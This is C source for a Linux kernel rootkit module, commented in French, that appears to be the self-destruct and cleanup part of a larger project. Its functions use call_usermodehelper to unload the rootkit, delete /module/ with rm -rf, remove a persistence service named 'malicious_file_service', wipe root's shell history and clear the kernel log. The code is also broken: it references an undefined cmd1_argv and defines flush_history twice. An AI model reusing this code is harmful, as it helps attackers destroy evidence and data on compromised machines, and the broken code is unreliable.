//Comment auto-détruire : 
//- unhide .ko (module_show() h_kill.h)
//- rmmod rootkit.ko 

#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/module.h>
#include <linux/fs.h>
#include <linux/uaccess.h>
#include <linux/sched.h>
#include <linux/kthread.h>
#include <linux/delay.h>
#include <linux/kallsyms.h>
#include <linux/fs_struct.h>
#include <linux/slab.h>
#include <linux/kthread.h>


#include "hooked_funcs/h_kill.h"
module_show()

void unload(void)
{
    char *cmd_argv[] = { "/bin/bash", "-c", "/sbin/rmmod rootkit", NULL };
    char *cmd_envp[] = { "HOME=/", "TERM=linux", "PATH=/sbin:/bin:/usr/sbin:/usr/bin", NULL };
    call_usermodehelper(cmd1_argv[0], cmd_argv, cmd_envp, UMH_WAIT_EXEC);

}

// - Supprimer /module

void kboom(void)
{
    char *cmd_argv[] = { "/bin/bash", "-c", "/bin/rm -rf /module/", NULL };
    char *cmd_envp[] = { "HOME=/", "TERM=linux", "PATH=/sbin:/bin:/usr/sbin:/usr/bin", NULL };
    call_usermodehelper(cmd1_argv[0], cmd_argv, cmd_envp, UMH_WAIT_EXEC);

}

//- Supprimer persistence rc-update et /etc/init.d script

void kboom_persistence(void)
{
    char *cmd_argv[] = { "/bin/bash", "-c", "rc-update del malicious_file_service && /bin/rm /etc/init.d/malicious_file_service", NULL };
    char *cmd_envp[] = { "HOME=/", "TERM=linux", "PATH=/sbin:/bin:/usr/sbin:/usr/bin", NULL };
    call_usermodehelper(cmd1_argv[0], cmd_argv, cmd_envp, UMH_WAIT_EXEC);
}

//- Effacer history 

void flush_history(void)
{
    char *cmd_argv[] = { "/bin/bash", "-c", "cat /dev/null > /root/.ash_history ", NULL };
    char *cmd_envp[] = { "HOME=/", "TERM=linux", "PATH=/sbin:/bin:/usr/sbin:/usr/bin", NULL };
    call_usermodehelper(cmd1_argv[0], cmd_argv, cmd_envp, UMH_WAIT_EXEC);
}




//- Effacer log (dmesg, syslog, /log/messages)

void flush_history(void)
{
    char *cmd_argv[] = { "/bin/bash", "-c", "dmesg --clear", NULL };
    char *cmd_envp[] = { "HOME=/", "TERM=linux", "PATH=/sbin:/bin:/usr/sbin:/usr/bin", NULL };
    call_usermodehelper(cmd1_argv[0], cmd_argv, cmd_envp, UMH_WAIT_EXEC);
}
